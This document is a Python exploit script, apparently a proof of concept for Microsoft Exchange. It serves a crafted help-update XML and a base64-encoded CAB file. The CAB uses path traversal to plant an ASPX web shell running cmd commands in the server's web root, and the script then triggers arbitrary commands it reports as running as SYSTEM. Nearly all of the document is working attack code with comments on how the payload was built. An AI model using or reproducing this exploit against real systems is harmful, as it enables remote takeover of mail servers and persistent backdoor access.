import sys
import base64
import urllib3
import requests
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CabRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        if self.path.endswith("poc.xml"):
            print("(+) delivering xml file...")
            xml = """<ExchangeHelpInfo>
  <HelpVersions>
    <HelpVersion>
      <Version>15.2.1.1-15.2.999.9</Version>
      <Revision>%s</Revision>
      <CulturesUpdated>en</CulturesUpdated>
      <CabinetUrl>http://%s:8000/poc.cab</CabinetUrl>
    </HelpVersion>
  </HelpVersions>
</ExchangeHelpInfo>""" % (r, s)
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml')
            self.send_header("Content-Length", len(xml))
            self.end_headers()
            self.wfile.write(str.encode(xml))
        elif self.path.endswith("poc.cab"):
            print("(+) delivering cab file...")
            # created like: makecab /d "CabinetName1=poc.cab" /f files.txt
            # files.txt contains: "poc.aspx" "../../../../../../../inetpub/wwwroot/aspnet_client/poc.aspx"
            # poc.aspx contains: <%=System.Diagnostics.Process.Start("cmd", Request["c"])%> 
            stage_2  = "TVNDRgAAAAC+AAAAAAAAACwAAAAAAAAAAwEBAAEAAAAPEwAAeAAAAAEAAQA6AAAA"
            stage_2 += "AAAAAAAAZFFsJyAALi4vLi4vLi4vLi4vLi4vLi4vLi4vaW5ldHB1Yi93d3dyb290"
            stage_2 += "L2FzcG5ldF9jbGllbnQvcG9jLmFzcHgARzNy0T4AOgBDS7NRtQ2uLC5JzdVzyUxM"
            stage_2 += "z8svLslMLtYLKMpPTi0u1gsuSSwq0VBKzk1R0lEISi0sTS0uiVZKVorVVLUDAA=="
            p = base64.b64decode(stage_2.encode('utf-8'))
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-cab')
            self.send_header("Content-Length", len(p))
            self.end_headers()
            self.wfile.write(p)
            return

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("(+) usage: %s <target> <connectback> <revision> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 mspaint" % sys.argv[0])
        print("(+) eg: %s 192.168.0.142 192.168.0.56 1337 \"whoami > c:/poc.txt\"" % sys.argv[0])
        sys.exit(-1)
    t = sys.argv[1]
    s = sys.argv[2]
    port = 8000
    r = sys.argv[3]
    c = sys.argv[4]
    print("(+) server bound to port %d" % port)
    print("(+) targeting: %s using cmd: %s" % (t, c))
    httpd = HTTPServer(('0.0.0.0', int(port)), CabRequestHandler)
    handlerthr = Thread(target=httpd.serve_forever, args=())
    handlerthr.daemon = True
    handlerthr.start()
    p = { "c" : "/c %s" % c }
    try:
        while 1:
            req = requests.get("https://%s/aspnet_client/poc.aspx" % t, params=p, verify=False)
            if req.status_code == 200:
                break
        print("(+) executed %s as SYSTEM!" % c)
    except KeyboardInterrupt:
        pass
